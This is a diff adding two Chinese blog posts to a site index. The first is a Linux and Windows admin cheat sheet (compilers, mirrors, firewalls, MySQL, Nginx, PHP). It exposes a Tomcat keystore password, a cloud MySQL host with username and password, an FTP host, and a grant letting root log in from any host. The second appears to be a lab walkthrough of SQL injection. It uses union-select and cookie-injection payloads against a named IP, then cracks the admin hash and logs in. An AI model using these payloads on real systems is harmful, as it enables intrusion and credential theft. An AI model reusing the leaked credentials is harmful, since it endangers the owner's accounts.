@@ -165,6 +165,656 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-linux命令总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class=" article-header">
+  
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/01/07/linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/">linux命令总结</a>
+    </h1>
+  
+
+  
+  <a href="/2020/01/07/linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/" class="archive-article-date">
+  	<time datetime="2020-01-07T04:19:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-07</time>
+</a>
+  
+
+
+  
+  </header>
+
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <pre><code>LINUX</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   gcc 编译器</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>  gcc [options] [filenames]<br>       -c只编译不连接，生成目标文件“.o”<br>       -S:只编译汇编，生成汇编代码<br>       -E:只进行预编译，不做其他处理<br>       -g:在可执行程序中包含标准试调信息<br>       -o file:指定输出文件<br>       -v:打印出编译器内部编译各过程的命令行信息和编译器的版本<br>       -std=name:指定C语言的标准（如C89 C90 C99等）<br>       -l dir:在头文件的搜索路径列表中添加dir目录<br>       -ansi:支持符合ANSI标准的C程序<br>       -pedantic:允许发出ANSI C标准所列的全部错误信息<br>       -w:关闭所有警告<br>       -Wall:允许发出gcc所提供的所有用的报警信息<br>       -L dir:在库文件的搜索路径列表中添加dir目录<br>       -static:链接静态库<br>       -lname:链接名为name的库文件<br>       -shared:表明是使用共享库<br>       -On:程序优化，O，O2，O3</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>   Ubuntu 18.04 LTS 软件源</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<h1 id="默认注释了源码镜像以提高-apt-update-速度，如有需要可自行取消注释"><a href="#默认注释了源码镜像以提高-apt-update-速度，如有需要可自行取消注释" class="headerlink" title="默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释"></a>默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</h1><p>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic main restricted universe multiverse</p>
+<h1 id="deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-main-restricted-universe-multiverse"><a href="#deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-main-restricted-universe-multiverse" class="headerlink" title="deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse"></a>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic main restricted universe multiverse</h1><p>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-updates main restricted universe multiverse</p>
+<h1 id="deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-updates-main-restricted-universe-multiverse"><a href="#deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-updates-main-restricted-universe-multiverse" class="headerlink" title="deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse"></a>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-updates main restricted universe multiverse</h1><p>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-backports main restricted universe multiverse</p>
+<h1 id="deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-backports-main-restricted-universe-multiverse"><a href="#deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-backports-main-restricted-universe-multiverse" class="headerlink" title="deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse"></a>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-backports main restricted universe multiverse</h1><p>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-security main restricted universe multiverse</p>
+<h1 id="deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-security-main-restricted-universe-multiverse"><a href="#deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-security-main-restricted-universe-multiverse" class="headerlink" title="deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse"></a>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-security main restricted universe multiverse</h1><h1 id="预发布软件源，不建议启用"><a href="#预发布软件源，不建议启用" class="headerlink" title="预发布软件源，不建议启用"></a>预发布软件源，不建议启用</h1><h1 id="deb-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-proposed-main-restricted-universe-multiverse"><a href="#deb-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-proposed-main-restricted-universe-multiverse" class="headerlink" title="deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse"></a>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-proposed main restricted universe multiverse</h1><h1 id="deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-proposed-main-restricted-universe-multiverse"><a href="#deb-src-https-mirrors-tuna-tsinghua-edu-cn-ubuntu-bionic-proposed-main-restricted-universe-multiverse" class="headerlink" title="deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse"></a>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-proposed main restricted universe multiverse</h1><pre><code>sudo apt-get update
+sudo apt-get upgrade</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   根目录执行脚本</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>   /home/./tomcat/bin/startup.sh</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>   用户管理</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<pre><code>sudo passwd root
+
+adduser [用户名] : 新增用户 
+passwd [用户名] : 修改用户密码 
+userdel -r [用户名]： 删除用户
+su [用户名]： 切换用户</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   文件管理</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>  在home下新建一个test.sh脚本<br>  vi /home/test.sh</p>
+<pre><code>:w   保存文件但不退出vi
+
+:w file 将修改另外保存到file中，不退出vi
+
+:w!   强制保存，不推出vi
+
+:wq  保存文件并退出vi
+
+:wq! 强制保存文件，并退出vi
+
+:q  不保存文件，退出vi
+
+:q! 不保存文件，强制退出vi
+
+:e! 放弃所有修改，从上次保存文件开始再编辑</code></pre><p> #-r是递归的删除参数表中的目录及其子目录。 目录将被清空并且删除。 当删除目录包含的具有写保护的文件时用户通常是被提示的。<br> #-f是不提示用户，删除目录下的所有文件。请注意检查路径，输成别的目录就悲剧了。<br> #-i是交互模式。使用这个选项，rm命令在删除任何文件前提示用户确认。</p>
+<p> 删除文件或文件夹<br>           rm  源文件或目录 目标文件或目录</p>
+<p> 移动文件或文件夹<br>          mv  源文件或目录 目标文件或目录</p>
+<p> 复制文件或文件夹<br>          cp 源文件或目录 目标文件或目录</p>
+<p> 重命名文件或文件夹<br>          mv 文件名或文件夹名 修改后的文件名或文件夹名</p>
+<p> 压缩包(解)压缩常用命令</p>
+<pre><code>.tar </code></pre><p>　　解包：tar xvf FileName.tar<br>　　打包：tar cvf FileName.tar DirName<br>　　<br>　　.gz<br>　　解压 1：gunzip FileName.gz<br>　　解压2：gzip -d FileName.gz<br>　　压缩：gzip FileName </p>
+<p>　　.tar.gz 和 .tgz<br>　　解压：tar zxvf FileName.tar.gz<br>　　压缩：tar zcvf FileName.tar.gz DirName 
+　　</p>
+<pre><code>.bz2 </code></pre><p>　　解压1：bzip2 -d FileName.bz2<br>　　解压2：bunzip2 FileName.bz2<br>　　压缩： bzip2 -z FileName </p>
+<p>　　.tar.bz2<br>　　解压：tar jxvf FileName.tar.bz2        或tar –bzip xvf FileName.tar.bz2<br>　　压缩：tar jcvf FileName.tar.bz2 DirName 
+　　</p>
+<p>　　.bz<br>　　解压1：bzip2 -d FileName.bz<br>　　解压2：bunzip2 FileName.bz<br>　　压缩：未知 </p>
+<p>　　.tar.bz<br>　　解压：tar jxvf FileName.tar.bz<br>　　压缩：未知<br>　　<br>       .Z<br>　　解压：uncompress FileName.Z<br>　　压缩：compress FileName<br>　　.tar.Z<br>　　解压：tar Zxvf FileName.tar.Z<br>　　压缩：tar Zcvf FileName.tar.Z DirName<br>　　<br>　　.zip<br>　　解压：unzip FileName.zip<br>　　压缩：zip FileName.zip DirName<br>　　压缩一个目录使用 -r 参数，-r 递归。例： $ zip -r FileName.zip DirName<br>　　<br>　　.rar<br>　　解压：rar x FileName.rar<br>　　压缩：rar a FileName.rar DirName<br>　　<br>　　<br>　　<br>      .lha<br>　　解压：lha -e FileName.lha<br>　　压缩：lha -a FileName.lha FileName </p>
+<p>　　———————————————<br>　　.rpm<br>　　解包：rpm2cpio FileName.rpm | cpio -div<br>　　———————————————<br>　　.deb<br>　　解包：ar p FileName.deb data.tar.gz | tar zxf -<br>　　———————————————<br>　　.tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar           .cpt .pit .sit .sea<br>　　解压：sEx x FileName.*<br>　　压缩：sEx a FileName.* FileName </p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>   配置JAVA环境</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p> vi /etc/profile</p>
+<p> export JAVA_HOME=/home/jdk-12<br> export PATH=$JAVA_HOME/bin:$PATH<br> export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</p>
+<p>   <strong><strong><em>JDK 8</em></strong></strong><br>   export JRE_HOME=$JAVA_HOME/jre      </p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>   防火墙管理</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>   启用区域端口和协议组合<br>   firewall-cmd [–zone=<zone>] –add-port=<port>[-<port>]/<protocol> [–timeout=<seconds>]</p>
+<p>   添加端口<br>   firewall-cmd –permanent –add-port=8080/tcp  </p>
+<p>   删除端口<br>   firewall-cmd –permanent –remove-port=8080/tcp</p>
+<p>   执行完毕会看到 success 这样的输出</p>
+<p>   重启服务才会生效：<br>   firewall-cmd –reload</p>
+<p>   查看端口是否开启<br>   firewall-cmd –permanent –query-port=8080/tcp</p>
+<p>   查看开放的端口：<br>   firewall-cmd –list-ports</p>
+<p> 1、开启80端口命令：/sbin/iptables -I INPUT -p tcp –dport 80 -j ACCEPT<br> 2、保存配置 命令：/etc/rc.d/init.d/iptables save<br> 3、重启服务命令 ：/etc/rc.d/init.d/iptables restart<br> 4、查看已经开放的端口： /etc/init.d/iptables status</p>
+<p> 关闭防火墙</p>
+<pre><code>systemctl stop firewalld.service</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   Tomcat配置</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<pre><code>&lt;!-- Authorization setting for SSL --&gt;
+&lt;login-config&gt;
+
+    &lt;auth-method&gt;CLIENT-CERT&lt;/auth-method&gt;
+
+    &lt;realm-name&gt;Client Cert Users-only Area&lt;/realm-name&gt;
+
+&lt;/login-config&gt;
+
+&lt;security-constraint&gt;
+
+    &lt;web-resource-collection&gt;
+
+        &lt;web-resource-name&gt;SSL&lt;/web-resource-name&gt;
+
+        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+
+    &lt;/web-resource-collection&gt;
+
+    &lt;user-data-constraint&gt;
+
+        &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;
+
+    &lt;/user-data-constraint&gt;
+
+&lt;/security-constraint&gt;
+
+
+[ Http Protocol Auto To Https Security Protocol ]
+
+
+&lt;Connector port=&quot;80&quot; protocol=&quot;HTTP/1.1&quot;
+           connectionTimeout=&quot;20000&quot;
+           redirectPort=&quot;443&quot;/&gt;
+
+
+&lt;Connector port=&quot;443&quot; protocol=&quot;HTTP/1.1&quot;
+           SSLEnabled=&quot;true&quot;
+           maxThreads=&quot;150&quot;
+           scheme=&quot;https&quot;
+           secure=&quot;true&quot;
+           keystoreFile=&quot;conf/bydengjie.com.pfx&quot;
+           keystorePass=&quot;SSi5jx47&quot;
+           clientAuth=&quot;false&quot;
+           sslProtocol=&quot;TLS&quot;/&gt;</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   安装MySQL</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p> 使用root登录</p>
+<pre><code>1.确保服务器系统处于最新状态
+[root@localhost ~]# yum -y update
+如果显示以下内容说明已经更新完成
+Replaced:
+  grub2.x86_64 1:2.02-0.64.el7.centos   grub2-tools.x86_64 1:2.02-0.64.el7.centos
+Complete!
+
+2.重启服务器
+[root@localhost ~]# reboot
+
+
+3.下载MySql安装包
+[root@localhost ~]# rpm -Uvh https://repo.mysql.com//mysql80-community-release-el7-1.noarch.rpm
+
+
+4.安装MySql
+[root@localhost ~]# yum install -y mysql-community-server
+如果显示以下内容说明安装成功
+Complete!
+
+5.设置开机启动Mysql
+[root@localhost ~]# systemctl enable mysqld.service
+
+6.检查是否已经安装了开机自动启动
+[root@localhost ~]# systemctl list-unit-files | grep mysqld
+如果显示以下内容说明已经完成自动启动安装
+mysqld.service                                enabled
+
+7.设置开启服务
+[root@localhost ~]# systemctl start mysqld.service
+
+8.查看MySql默认密码
+[root@localhost ~]# grep &apos;temporary password&apos; /var/log/mysqld.log
+
+9.登录MySql，输入用户名和密码
+[root@localhost ~]# mysql -u root -p
+
+10.修改当前用户密码
+mysql&gt;ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;XXX&apos;;
+
+11.开启远程登录，授权root远程登录
+mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;XXX&apos; WITH GRANT OPTION;
+
+13.命令立即执行生效
+mysql&gt;flush privileges;</code></pre><p>——    其他功能:</p>
+<pre><code>#配置MySQL安全策略
+[root@localhost ~]# mysql_secure_installation
+
+
+# 检查并且显示MySQL相关安装包
+[root@localhost ~]# rpm -qa | grep mysql
+
+# 删除MySql
+[root@localhost ~]# yum remove -y mysql mysql mysql-server mysql-libs compat-mysql80
+或
+[root@localhost ~]# rpm -e mysql-community-libs-5.7.20-1.el7.x86_64 --nodeps
+或
+[root@localhost ~]# yum -y remove mysql-community-libs-5.7.20-1.el7.x86_64
+
+# 查看MySql相关文件
+[root@localhost ~]# find / -name mysql
+
+# 重启MySql服务
+[root@localhost ~]# service mysqld restart
+
+# 查看MySql版本
+[root@localhost ~]# yum repolist all | grep mysql
+
+# 查看当前的启动的 MySQL 版本
+[root@localhost ~]# yum repolist enabled | grep mysql
+
+# 通过Yum来安装MySQL,会自动处理MySQL与其他组件的依赖关系
+[root@localhost ~]# yum install mysql-community-server 
+
+# 查看MySQL安装目录
+[root@localhost ~]# whereis mysql 
+
+# 测试MySQL是否安装成功
+[root@localhost ~]# mysql 
+
+# 查看所有数据库用户
+mysql&gt;SELECT DISTINCT CONCAT(&apos;User: &apos;&apos;&apos;,user,&apos;&apos;&apos;@&apos;&apos;&apos;,host,&apos;&apos;&apos;;&apos;) AS query FROM mysql.user; 
+
+#修改用户密码
+mysql&gt;alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos;XXX&apos;;</code></pre><p>——    vi /etc/my.cnf</p>
+<pre><code>[mysqld]
+character-set-server=utf8 
+
+[client]
+default-character-set=utf8 
+[mysql]
+default-character-set=utf8</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   安装Nginx</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>——    Windows</p>
+<pre><code>             启动
+             直接点击Nginx目录下的nginx.exe    或者    cmd运行start nginx
+             关闭
+             nginx -s stop    或者    nginx -s quit
+             stop表示立即停止nginx,不保存相关信息
+             quit表示正常退出nginx,并保存相关信息
+             重启(因为改变了配置,需要重启)
+             nginx -s reload
+
+
+一、安装编译工具及库文件
+       yum -y install make zlib zlib-devel gcc-c++ libtool  openssl openssl-devel
+
+二、首先要安装 PCRE
+       [root@bogon src]# cd /usr/local/src/
+       [root@bogon src]# wget http://downloads.sourceforge.net/project/pcre/pcre/8.35/pcre-8.35.tar.gz
+
+         编译安装  
+         [root@bogon pcre-8.35]# ./configure
+         [root@bogon pcre-8.35]# make &amp;&amp; make install</code></pre><p>——    获取Nginx</p>
+<pre><code>       下载
+       [root@bogon src]# cd /usr/local/src/
+       [root@bogon src]# wget http://nginx.org/download/nginx-1.6.2.tar.gz
+
+       进入安装包目录编译安装
+       [root@bogon nginx-1.6.2]# ./configure --prefix=/usr/local/webserver/nginx --with-http_stub_status_module --with-http_ssl_module --with-pcre=/usr/local/src/pcre-8.35
+       [root@bogon nginx-1.6.2]# make
+       [root@bogon nginx-1.6.2]# make install
+
+
+Nginx 配置
+
+               创建 Nginx 运行使用的用户 www：
+               [root@bogon conf]# /usr/sbin/groupadd www 
+               [root@bogon conf]# /usr/sbin/useradd -g www www
+
+               修改配置文件：
+               [root@bogon conf]#  /usr/local/webserver/nginx/conf/nginx.conf
+
+               检查配置文件nginx.conf的正确性命令： 
+               [root@bogon conf]# /usr/local/webserver/nginx/sbin/nginx -t
+
+启动 Nginx
+
+               Nginx 启动命令如下：
+               [root@bogon conf]# /usr/local/webserver/nginx/sbin/nginx
+
+
+
+Nginx 其他命令
+
+               以下包含了 Nginx 常用的几个命令：
+              /usr/local/webserver/nginx/sbin/nginx -s reload            # 重新载入配置文件
+              /usr/local/webserver/nginx/sbin/nginx -s reopen            # 重启 Nginx
+              /usr/local/webserver/nginx/sbin/nginx -s stop              # 停止 Nginx</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   配置PHP运行环境</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<pre><code>获得php tar.gz 压缩包
+wget http://cn2.php.net/distributions/php-7.3.3.tar.gz</code></pre><hr>
+<pre><code>rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm   
+rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm
+
+
+sudo yum -y install php72w
+
+yum -y install php72w-cli php72w-common php72w-devel php72w-mysql
+
+
+对于wordpress应用，可能还需安装如下包：
+       sudo yum -y install php72w-gd php72w-imap php72w-ldap php72w-odbc php72w-pear php72w-xml php72w-xmlrpc
+
+
+php -v
+
+yum -y install php-mysql
+
+安装php连接MySQL依赖项
+
+
+卸载PHP
+       yum remove php
+
+查看全部软件包
+       rpm -qa|grep php
+
+
+优先卸载没有依赖项的文件
+       rpm -e </code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   安装SQLServer</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<pre><code>1、下载 Microsoft SQL Server Red Hat 存储库配置文件：
+      sudo curl -o /etc/yum.repos.d/mssql-server.repo https://packages.microsoft.com/config/rhel/7/mssql-server-2017.repo
+
+2、sudo yum install -y mssql-server
+
+3、sudo /opt/mssql/bin/mssql-conf setup
+
+4、systemctl status mssql-server
+
+注：
+      如果需要授予远程登录，则开放1433端口
+
+
+安装 SQL Server 命令行工具
+
+
+1、下载 Microsoft Red Hat 存储库配置文件。
+      sudo curl -o /etc/yum.repos.d/msprod.repo https://packages.microsoft.com/config/rhel/7/prod.repo
+
+2、sudo yum install -y mssql-tools unixODBC-devel
+
+3、echo &apos;export PATH=&quot;$PATH:/opt/mssql-tools/bin&quot;&apos; &gt;&gt; ~/.bash_profile
+     echo &apos;export PATH=&quot;$PATH:/opt/mssql-tools/bin&quot;&apos; &gt;&gt; ~/.bashrc
+     source ~/.bashrc
+
+
+
+
+
+                                               WINDOWS</code></pre><blockquote>
+<blockquote>
+<blockquote>
+<p>   7-Zip</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>   解压：<br>         7z x {fileName} -o{outputDirectory}</p>
+<p>   a      将文件添加到压缩档案中<br>   b      测试压缩或解压算法执行时的 CPU 占用<br>   d      从压缩档案中删除文件<br>   e      将压缩档案中的所有文件解压到指定路径，所有文件将输出到同一个目录中<br>   h      计算文件的哈希值<br>   i       显示有关支持格式的信息<br>   l       列出压缩档案的内容<br>   rn    重命名压缩档案中的文件<br>   t      测试压缩档案的完整性<br>   u     更新要进入压缩档案中的文件<br>   x     将压缩档案中的所有文件解压到指定路径，并包含所有文件的完整路径</p>
+<p>   压缩：<br>          7z a Images.7z C:\Users\Pisces\Desktop\Images* -mx9</p>
+<p>   压缩率：<br>          -mx0 仅存储不压缩（速度最快，无压缩，zip大小等同原始文件夹）<br>          -mx1 极速压缩<br>          -mx3 快速压缩<br>          -mx5 标准压缩<br>          -mx7 最大压缩<br>          -mx9 极限压缩 </p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>   虚拟主机</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<pre><code>ftp地址：dengjie9934.ftp-gz01.bcehost.com
+              182.61.12.199
+ftp端口：8010
+
+mysql -hb-0csmyvhyfumy6b.bch.rds.gz.baidubce.com -ub_0csmyvhyfumy6b -p
+
+
+地址：b-0csmyvhyfumy6b.bch.rds.gz.baidubce.com
+端口：3306
+用户名：b_0csmyvhyfumy6b
+密码：a93f764068eb4a0e9f77c434b8a64308
+数据库名：b_0csmyvhyfumy6b
+
+
+
+#文件名带有空格使用&quot;&quot;包含文件名即可
+
+#重置
+ssh-keygen -R xxx.xxx.xxx.xxx
+
+#创建新的文件
+echo. 文本内容&gt; 1.txt
+
+#重命名
+ren old_name new_name
+支持使用通配符
+
+#合并文件
+copy *.txt 合并文件.txt
+
+#移动文件或文件夹
+move 文件/文件夹 新路径</code></pre><hr>
+<pre><code>dir 显示目录和文件
+cd 进入目录
+del 删除文件
+rd 删除空目录（目录中不能有子目录和文件）
+deltree 删除目录并同时删除目录中的子目录以及文件
+rmdir  删除整个目录
+         好比说我要删除 222 这个目录下的所有目录和档案，这语法就是： 
+                  rmdir /s/q 222 
+         其中： 
+         /s 是代表删除所有子目录跟其中的档案。 
+         /q 是不要它在删除档案或目录时，不再问我 Yes or No 的动作。</code></pre><p>——    sftp常用命令<br>                         ls  查看当前目录下文件<br>                         help 查看sftp支持哪些命令<br>                         cd  指定目录<br>                         pwd 查看当前目录<br>                         get  xxx.txt 下载xxx文件<br>                         put  xxx.txt 上传xxx文件<br>                         mput 文件原名.tar.gz 上传到到服务器的文件名.tar.gz<br>                         quit / bye / exit 退出sftp<br>                         sftp  xxx.xxx.xxx.xxx   登录root用户<br>                         sftp <a href="mailto:zygf@xxx.xxx.xxx.xxx">zygf@xxx.xxx.xxx.xxx</a>  进行登录zygf用户<br>                         put -r [文件夹名称]/.  上传文件夹下子文件夹以及子文件夹下的所有文件</p>
+<p>——    常用的FTP命令<br>                          open：与服务器相连接<br>                          send(put)：上传文件<br>                          get：下载文件<br>                          mget：下载多个文件<br>                          cd：切换目录<br>                          dir(ls)：查看当前目录下的文件；<br>                          del：删除文件<br>                          bye(quit)：中断与服务器的连接</p>
+
+    
+
+    
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/01/07/linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-web简单的sql注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class=" article-header">
+  
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/01/07/web%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/">web简单的sql注入</a>
+    </h1>
+  
+
+  
+  <a href="/2020/01/07/web%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2020-01-07T03:54:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-07</time>
+</a>
+  
+
+
+  
+  </header>
+
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>——————————————————第一题sql注入<br>第一步，判断是否存在sql注入漏洞在地址栏添加<br>构造 ?id=1 and 1=1 ，回车<br>2.页面返回正常<br>构造 ?id=1 and 1=2 ,回车<br>第二步:判断字段数<br>构造 ?id=1 and 1=1 order by 1 回车<br>页面正常<br>构造 ?id=1 and 1=1 order by 2 回车<br>页面正常<br>构造 ?id=1 and 1=1 order by 3 回车<br>页面返回 错误，判断字段数为   2<br>第三步：判断回显点<br>构造 ?id=1 and 1=2 union select 1,2 回车<br>页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容<br>第四步:查询相关内容<br>查询当前数据库名<br>构造 ?id=1 and 1=2 union select 1,database() 回车<br>查询当前数据库版本<br>构造 ?id=1 and 1=2 union select 1,version() 回车<br>查询当前数据库 表名<br>构造 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 回车<br>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 回车<br>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 1,1 回车<br>构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1 回车<br>查出 admin 表里 有  id   username  password  三个字段<br>查询字段内容<br>构造 ?id=1 and 1=2 union select 1,username from admin  limit 0,1 回车<br>构造 ?id=1 and 1=2 union select 1,password from admin  limit 1,1 回车<br>limit 1,1 没有回显，说明只有一个用户<br>构造 ?id=1 and 1=2 union select 1,password from admin  limit 0,1 回车<br>得到管理员账号和密码<br>————————————第二题cookie注入<br>我们尝试，将测试语句放到cookie里面，再发送给服务器，因为网页防护一般只拦截Get、post传参。<br>我们打开Chrome浏览器，这里用到了ModHeader插件（可点击这里或在附件下载）。<br>我们点击+号新增一个Request头。<br>我们添加一个Cookie头，并写值为id=171，并确保已开启（打勾）<br>我们直接访问<br><a href="http://120.203.13.111:8001/shownews.asp" target="_blank" rel="noopener">http://120.203.13.111:8001/shownews.asp</a><br>返回显示正常，<br>这证明cookie里的id=171，也能正常传参，被当作sql语句拼接。那我们直接进行注入。<br>我们输入Cookie值为：<br>id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin<br>继续猜测是否存在admin表（+号代替空格，不然会出错）<br>发现页面回显了2、3、7、8、9。<br>没有出现数据库错误，这证明admin表是存在的。且第2、第3、7、8、9字段，可以用来猜测字段名，同时，可以直接回显在页面上。<br>我们接着尝试猜测最常见的管理表字段名Username和Password，我们在2、3、7、8、9中任选两个，分别填入Username和Password<br>比如2和3：<br>id=171+union+select+1,username,password,4,5,6,7,8,9,10+from+admin<br>接着刷新页面，发现页面返回了admin表中，username和password字段的值：admin、b9a2a2b5dffb918c<br>这应该就是管理员用户名和密码了，但管理员密码看起来有些奇怪。字母+数字的16位组合，很像md5的特征。<br>打开cmd5.com（解密站点）<br>将b9a2a2b5dffb918c进行解密。<br>发现密码的明文是welcome。<br>这个站貌似是南方的CMS，默认管理员后台是根目录的/admin/。<br>我们尝试打开后台：<br><a href="http://120.203.13.111:8001/admin/" target="_blank" rel="noopener">http://120.203.13.111:8001/admin/</a><br>出现管理员登录页面，输入用户名admin、密码welcome，填写验证码。</p>
+
+    
+
+    
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/01/07/web%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
